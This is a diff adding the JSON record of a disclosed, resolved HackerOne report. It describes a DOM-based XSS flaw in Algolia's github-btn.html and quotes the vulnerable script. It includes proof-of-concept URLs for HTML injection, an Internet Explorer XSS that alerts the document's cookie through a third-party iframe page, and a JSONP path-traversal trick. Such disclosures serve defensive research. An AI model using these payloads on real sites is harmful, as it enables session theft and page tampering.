@@ -1,0 +1,255 @@
+{
+    "id": 200826,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDA4MjY=",
+    "url": "https://hackerone.com/reports/200826",
+    "title": "[github.algolia.com] DOM Based XSS github-btn.html",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2017-01-24T15:45:48.165Z",
+    "submitted_at": "2017-01-24T15:45:48.165Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "bobrov",
+        "url": "/bobrov",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 443,
+        "url": "https://hackerone.com/algolia",
+        "handle": "algolia",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Algolia",
+            "twitter_handle": "algolia",
+            "website": "https://algolia.com",
+            "about": "Hosted search API that delivers instant and relevant results from the first keystroke"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2017-03-31T19:42:12.862Z",
+    "bug_reporter_agreed_on_going_public_at": "2017-03-01T19:42:09.698Z",
+    "team_member_agreed_on_going_public_at": null,
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Description\n===\n\n**Vulnerable parameter:** user\n**Vulnerable script:** https://github.algolia.com/github-btn.html\n**Vulnerable code:**\n```js\n        var params = function() {\n                for (var t, e = [], o = window.location.href.slice(window.location.href.indexOf(\"?\") + 1).split(\"&\"), r = 0; r < o.length; r++) t = o[r].split(\"=\"), e.push(t[0]), e[t[0]] = t[1];\n                return e\n            }(),\n            user = params.user,\n            repo = params.repo,\n            type = params.type,\n ...\n  \"follow\" == type && (mainButton.className += \" github-me\", text.innerHTML = \"Follow @\" + user, button.href = \"https://github.com/\" + user\n```\n\nPoCs\n===\n\n**PoC #1**\nHTML Injection for Chrome, Internet Explorer\n\n```\nhttps://github.algolia.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow\n```\n\n**PoC #2**\nXSS for Internet Explorer (using X-UA-Compatible IE=9)\n\n```\nhttps://blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://github.algolia.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E\n```\n\n\nAnother vulns\n===\n\nAlso, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.\nBut for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).\n\n```js\nfunction jsonp(t) {\n  var e = document.createElement(\"script\");\n  e.src = t + \"?callback=callback\", head.insertBefore(e, head.firstChild)\n}\n...\njsonp(\"follow\" == type ? \"https://api.github.com/users/\" + user : \"https://api.github.com/repos/\" + user + \"/\" + repo);\n```\n\n**PoC**\n\n```\nhttps://github.algolia.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork\n```\n\n**Result**\n```\nhttps://api.github.com/another/endpoint?callback=callback\n```",
+    "bounty_amount": "100.0",
+    "formatted_bounty": "$100",
+    "weakness": {
+        "id": 60,
+        "name": "Cross-site Scripting (XSS) - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 154745,
+            "file_name": "Screenshot_at_19-44-33.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/154/745/a0cb40cc10447d534b4c77f2d38bc765e08c5563/Screenshot_at_19-44-33.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_19-44-33.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_19-44-33.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4UQSXQTZ%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD59ppTHrSDLCThycBLwNdaicdZ1Nkoq794uNUuMYn7HgIgdbodqCaSryZkQSXqlYLEKOLF6hjOoJAqBjNkbysEDsYquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEqs7RshbJVIe6WmQSqPBTBjq5SJ4q2CFU%2FmeAnF%2BkLDSlM1eKfT3AntsXsYewzVdZNknCZoZqHzPbc5FH2N8lZFVGzmpJpr27FRlCsAWaKmgfsL5fGeRGnvBUcZHDi6EAyStUFtqIr1M3TzgrnTfY5UYO0%2FD4ZhH66Ys5%2BbUNhRLZdO0I2ILB5NEU86UrWlx5lS8DVVL73aD3yDBKTkTBXGVadmGL68bex9ULnLYcI1JV7%2Bs0ndoDemjf8hoXwE15JNm42EhtanowcY7MgWhIG2bhovQjjIq3UOJoqNjiT3N6yEzBJjYl6MYD4CzT5kf8c2Fl3Jqs9NOoYHc%2BFR0VgoGJlve6BvF%2FzEl%2FlsQA7yGl5XY47VkmzipXcgUrnCCLLSPNkiOtn%2FgdU2zNCsHbNPc5RcprLVz0lHjvF9PpbUjXnfS0C%2BIYiNGLSi2%2B2UB1ksAJNmIuVo76nQMAof%2FYB0RaR%2BidgmBPHRQjAmwL9favSIq0YOb2c8pIkV7oKTUftSZNzHerEseaUieSzHzqmXMzsQFQ0mZWvjNRe7ls60t%2B0gdLjz2KT6Mbam6yM%2BqORxZRZl10aCqM8D8F4tbi8RDUHeIBeHQMxR92XqNtntoZDgJAf2TshBpZEtk2RIFuNFrE2HuWV4Dxsu2osMeMQDickU%2BEOj7aEN0rgsJp0RQ1MGwvCVdo0ALv6WXD7Vs8KQw8fS%2FFrHAoOOa7uBHf3wIDkbgorgCgxrTO7RVZ1LHN8X9%2BhvLwU9p73SHDE0Dcpk0nQ%2FL%2BYh0yhxTK47QW7yMhNFKCyn0G8LnVisMI443rLrAUs2IqsIJTvgUf7fv1j4wVOfIGnKnAa4DS8gUqfX4N811OkU2PR1uF9GbpH%2B8Q7C80cpn4H5xuSe95AwkZm2pwY6sQHNFeGRCycS9nkZJ%2FuKAu32klfmdKcEXE%2BA89m664jWpbKtk8h0zy%2Fm%2BiefngsNdSqx6QRrNidGzU%2F8rFNfWwFOr8oydpHDYpPU2IvE9IiWkgzRPIJUeU%2FmUqQV7ZojZOSr8Qub%2Fr7DXO6Wnenpy7Dl0MfikGJLyeBmI0JfR6662ud7zrsJdM2G%2Fd1W0OeXc%2BP%2BEUV2NFaDLCnfrz8WazfrSKNcIZOrXFpQBDOUcMr9qME%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2d11b9db827aeaa103978f93e92d9a854d31ffe11f86e5e68f7c2ea8887001f2",
+            "file_size": 19733,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2017-03-31T19:42:09.726Z",
+    "allow_singular_disclosure_after": -202307011.93720654,
+    "singular_disclosure_allowed": true,
+    "vote_count": 14,
+    "voters": [
+        "delimitry",
+        "bogdantcaciuc",
+        "bobrov",
+        "hunter",
+        "madrobot",
+        "eveeez",
+        "mpz",
+        "linkks",
+        "japz",
+        "sumit7",
+        "and 4 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 1444788,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Vulnerability fixed",
+            "automated_response": false,
+            "created_at": "2017-01-26T08:03:40.696Z",
+            "updated_at": "2017-01-26T08:03:40.696Z",
+            "actor": {
+                "username": "bobrov",
+                "cleared": false,
+                "verified": false,
+                "url": "/bobrov",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "algolia"
+        },
+        {
+            "id": 1447950,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thank you for the report. Yes, it got fixed, thank you for the confirmation.",
+            "automated_response": false,
+            "created_at": "2017-01-27T13:50:59.488Z",
+            "updated_at": "2017-01-27T13:50:59.488Z",
+            "actor": {
+                "username": "adams",
+                "cleared": false,
+                "verified": false,
+                "url": "/adams",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "bobrov",
+                "url": "/bobrov"
+            },
+            "genius_execution_id": null,
+            "team_handle": "algolia"
+        },
+        {
+            "id": 1447951,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Despite the report being out of the scope we have decided to exceptionally award the bounty.",
+            "automated_response": false,
+            "created_at": "2017-01-27T13:51:09.020Z",
+            "updated_at": "2017-01-27T13:51:09.020Z",
+            "actor": {
+                "url": "/algolia",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Algolia"
+                }
+            },
+            "bounty_amount": "100.0",
+            "bonus_amount": "0.0",
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "algolia",
+            "collaborator": {
+                "username": "bobrov",
+                "url": "/bobrov"
+            }
+        },
+        {
+            "id": 1514113,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-03-01T19:42:09.714Z",
+            "updated_at": "2017-03-01T19:42:09.714Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "bobrov",
+                "cleared": false,
+                "verified": false,
+                "url": "/bobrov",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "algolia"
+        },
+        {
+            "id": 1575986,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-03-31T19:42:12.892Z",
+            "updated_at": "2017-03-31T19:42:12.892Z",
+            "actor": {
+                "url": "/algolia",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Algolia"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "algolia"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
